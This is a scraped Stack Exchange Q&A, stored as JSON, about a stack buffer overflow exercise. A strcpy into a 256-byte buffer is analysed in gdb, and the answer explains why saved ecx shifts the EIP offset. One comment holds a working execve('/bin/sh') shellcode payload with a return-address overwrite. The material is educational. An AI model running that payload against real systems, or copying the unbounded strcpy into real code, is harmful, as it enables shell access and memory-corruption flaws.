@@ -1,0 +1,48 @@
+{
+  "title": "Why EIP is being overwritten before local buffer ends?",
+  "link": "https://reverseengineering.stackexchange.com/questions/21995/why-eip-is-being-overwritten-before-local-buffer-ends",
+  "content": "I am doing a simple buffer overflow exercise, here is the source:\n\n```\n//vuln.c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char* argv[]) {\n    char buf[256];\n    strcpy(buf,argv[1]);\n    printf(\"Input:%s  \n\",buf);\n    return 0;\n}\n\n```\nComplied with gcc (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609 on Ubuntu 16.04.6 (i686) like this (ASLR disabled):\n\n```\n$ gcc -g -fno-stack-protector -z execstack -o vuln vuln.c\n\n```\nThe gdb disassembly:\n\n```\nDump of assembler code for function main:\n   0x0804843b <+0>:     lea    ecx,[esp+0x4]\n   0x0804843f <+4>:     and    esp,0xfffffff0\n   0x08048442 <+7>:     push   DWORD PTR [ecx-0x4]\n   0x08048445 <+10>:    push   ebp\n   0x08048446 <+11>:    mov    ebp,esp\n   0x08048448 <+13>:    push   ecx\n   0x08048449 <+14>:    sub    esp,0x104\n   0x0804844f <+20>:    mov    eax,ecx\n   0x08048451 <+22>:    mov    eax,DWORD PTR [eax+0x4]\n   0x08048454 <+25>:    add    eax,0x4\n   0x08048457 <+28>:    mov    eax,DWORD PTR [eax]\n   0x08048459 <+30>:    sub    esp,0x8\n   0x0804845c <+33>:    push   eax\n   0x0804845d <+34>:    lea    eax,[ebp-0x108]\n   0x08048463 <+40>:    push   eax\n   0x08048464 <+41>:    call   0x8048310 <strcpy@plt>\n   0x08048469 <+46>:    add    esp,0x10\n   0x0804846c <+49>:    sub    esp,0x8\n   0x0804846f <+52>:    lea    eax,[ebp-0x108]\n   0x08048475 <+58>:    push   eax\n   0x08048476 <+59>:    push   0x8048510\n   0x0804847b <+64>:    call   0x8048300 <printf@plt>\n   0x08048480 <+69>:    add    esp,0x10\n   0x08048483 <+72>:    mov    eax,0x0\n   0x08048488 <+77>:    mov    ecx,DWORD PTR [ebp-0x4]\n   0x0804848b <+80>:    leave\n   0x0804848c <+81>:    lea    esp,[ecx-0x4]\n   0x0804848f <+84>:    ret\nEnd of assembler dump.\n\n```\nWhen I am overwriting the EIP with:\n\n```\naaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111111111111111111111111111111111111111111111111111\n\n```\nIt gives me EIP: 0x5a5a5a5a ('ZZZZ'), meaning that the offset for return address is 208. So how could that be when 256 byte buffer is allocated? How would main() stack layout look like? I thought it should be something like this:\n\n```\n|  argc\n|  argv\n|  Return address\n|  Caller's EBP       <-- EBP\n|  Alignment\n|  Local variables    <-- buf ends here\n|  ...\n|  Local variables    <-- buf starts here\n|  ...\n|  ...\n|  ...                <-- ESP\nV\nLower addresses\n\n```\nAnd also I quite confused why I cannot control EIP when the length of the argument string is bigger than 260. Here is what I mean.\n\nThis is the result of running gdb-peda$ r `python -c 'print \"A\"*260'`\n\n\n\nThis is the result of running gdb-peda$ r `python -c 'print \"A\"*261'`\n\n\n\nAnd this is the result of running gdb-peda$ r `python -c 'print \"A\"*262'`\n\n\n\nHelp is much appreciated. Thanks!\n\n",
+  "votes": "3",
+  "answers": 1,
+  "views": "327",
+  "tags": [
+    "disassembly",
+    "gdb",
+    "buffer-overflow",
+    "stack"
+  ],
+  "user": "JoaoAlby",
+  "time": "Aug 28, 2019 at 19:05",
+  "comments": [],
+  "answers_data": [
+    {
+      "content": "The esp value at the end of the function is computed based on the ecx value stored on the stack. This value is stored immediately \"above\" (has higher address) the buffer which in your case has 260 bytes instead of 256 (notice sub esp, 0x104 - the reason behind this is to keep the stack aligned to 16 bytes before each function call). So why does providing 260 bytes causes segmentation fault at all?\n\nBecause you are providing 261 bytes since there is one extra NULL byte at the end of each string in C! So what happens, is that you are actually overwriting the least significant byte of ecx value stored on the stack. You set it as 0x00, so it most likely decreases its value. At the end of the function, esp gets the value ecx-0x4=previous_ecx/256-4 instead of previous_ecx-4, so ret will set eip according to that value. As you see, esp has most likely decresed, so that now it points to \"ZZZZ\" inside the buffer. The image below shows the stack layout of the program:\n\n\nWhen you put only \"A\"'s, exactly the same thing happens. The situation slightly changes when you put more \"A\"'s, but just look at the ecx value shown by gdb: it gets more 0x41's at the end and the NULL byte before, causing esp to be changed to more random values.\n\n",
+      "votes": "2",
+      "user": "bart1e",
+      "time": "Aug 30, 2019 at 9:50",
+      "is_accepted": true,
+      "comments": [
+        {
+          "user": "JoaoAlby",
+          "text": "Thanks for the answer! But I am still not quite sure why EIP is being overwritten at the 204 position (where \"ZZZZ\" is) — it's 56 bytes away from the buffer! This payload works just fine to exploit the overflow: python -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" + \"a\"*176 + \"\\xbf\\xff\\xed\\x30\"[::-1] + \"a\"*52'. I send the shellcode first, then \"a\" junk, then the ret address and then another 52 bytes of \"a\" junk.",
+          "time": null
+        },
+        {
+          "user": "bart1e",
+          "text": "If ecx had the least significant byte equal to 0x34, then the esp at the end of the function will have its correct value decreased by 0x38=56 for example. If it had bigger lsb, it would decrease even further, up to 259=0xff+0x4.",
+          "time": null
+        },
+        {
+          "user": "bart1e",
+          "text": "Just check the top of the stack just before allocating space for the buffer and you will get this least significant byte.",
+          "time": null
+        },
+        {
+          "user": "bart1e",
+          "text": "You are welcome. In my first comment I meant it can decrease up to 255 bytes, not 259, but it's too late to edit it.",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
